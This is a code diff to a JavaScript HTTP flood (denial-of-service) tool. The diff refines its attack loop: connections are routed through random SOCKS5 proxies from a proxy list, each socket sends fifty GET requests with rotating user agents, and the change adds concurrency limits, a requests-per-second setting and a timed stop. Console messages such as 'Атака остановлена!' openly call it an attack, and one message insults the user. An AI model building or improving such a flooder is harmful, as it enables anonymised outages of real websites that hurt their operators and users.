@@ -6,6 +6,8 @@ import net from 'net';
 import { Socket } from 'net';
 import { SocksProxyAgent } from 'socks-proxy-agent';
 
+import {WebSocket,WebSocketServer}  from 'ws';
+
 function randomNumber(min, max) {  
     return Math.floor(Math.random() * (max - min) + min); 
 }
@@ -16,10 +18,15 @@ var host = '';
 var time = 0;
 
 export function setTargetURL(url) {
-    target = url;
-    console.log(`Target URL set to: ${target}`);
-	parsed = new URL(target);
-	host =parsed.host;
+	try{
+		target = url;
+		console.log(`Target URL set to: ${target}`);
+		parsed = new URL(target);
+		host =parsed.host;
+	}catch{
+		console.log('А теперь нормально введи url, сучка!')
+		target = '';
+	}
 }
 
 export function setAttackDuration(duration){
@@ -4578,36 +4585,77 @@ const UAs = [
 ];
 
 const proxies = fs.readFileSync('proxies.txt', 'utf-8').split('\n').filter(Boolean);
-
-var int;
-export function StartAtack(){
-	int = setInterval(() => {
-		const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-		const agent = new SocksProxyAgent('socks5://'+proxy); // Создаем агент для прокси
-		const s = new Socket();
-		s.connect(80, host,agent);
-		s.setTimeout(10000);
-		for (var i = 0; i < 50; i++) {
-			s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
-		}
-		s.on('data', function () {
-			setTimeout(function () {
-				s.destroy();
-				return 'Delete'
-			}, 5000);
-		})
-	});
-	setTimeout(() => clearInterval(int), time * 1000);
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
 }
-export function StopAtack(){
-	clearInterval(int)
+var int;
+export async function StartAttack(maxSocks,requestsPerSecond) {
+	if (target == ''){
+		return;
+	}
+    const delay = 1000 / requestsPerSecond;
+    const maxConnections = maxSocks; // Ограничение количества одновременных подключений
+    let activeConnections = 0;  // Счётчик активных подключений
+    
+    const performRequest = async () => {
+        if (activeConnections >= maxConnections) {
+            // Ждем, если слишком много активных соединений
+            await sleep(100);
+            return performRequest();
+        }
+
+        try {
+            activeConnections++;
+            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
+            let agent = new SocksProxyAgent('socks5://' + proxy); // Создаем агент для прокси
+            let s = new Socket();
+            
+            s.connect(80, host, agent);
+            s.setTimeout(10000);
+            
+            s.on('error', (err) => {
+                console.error(`Socket error: ${err.message}`);
+                s.destroy();
+            });
+
+            for (let i = 0; i < 50; i++) {
+                s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
+            }
+
+            s.on('data', function () {
+                setTimeout(function () {
+                    s.destroy();
+                    activeConnections--;
+                }, 5000);
+            });
+
+            // Ждем перед следующим запросом
+            await sleep(delay);
+        } catch (error) {
+            console.error(`Request error: ${error.message}`);
+        } finally {
+            activeConnections--;
+        }
+    };
+
+    int = setInterval(performRequest, delay);
+
+    // Останавливаем тест через заданное время
+    setTimeout(() => clear(int), time * 1000);
+}
+function clear(interval){
+	clearInterval(interval)
+	console.log('Attack stoped')
+}
+export function StopAttack(){
+	clear(int)
 	console.log('Атака остановлена!')
 }
 
 
 process.on('uncaughtException', function (err) {
-    // console.log(err);
+    //console.log(err);
 });
 process.on('unhandledRejection', function (err) {
-    // console.log(err);
+    //console.log(err);
 });
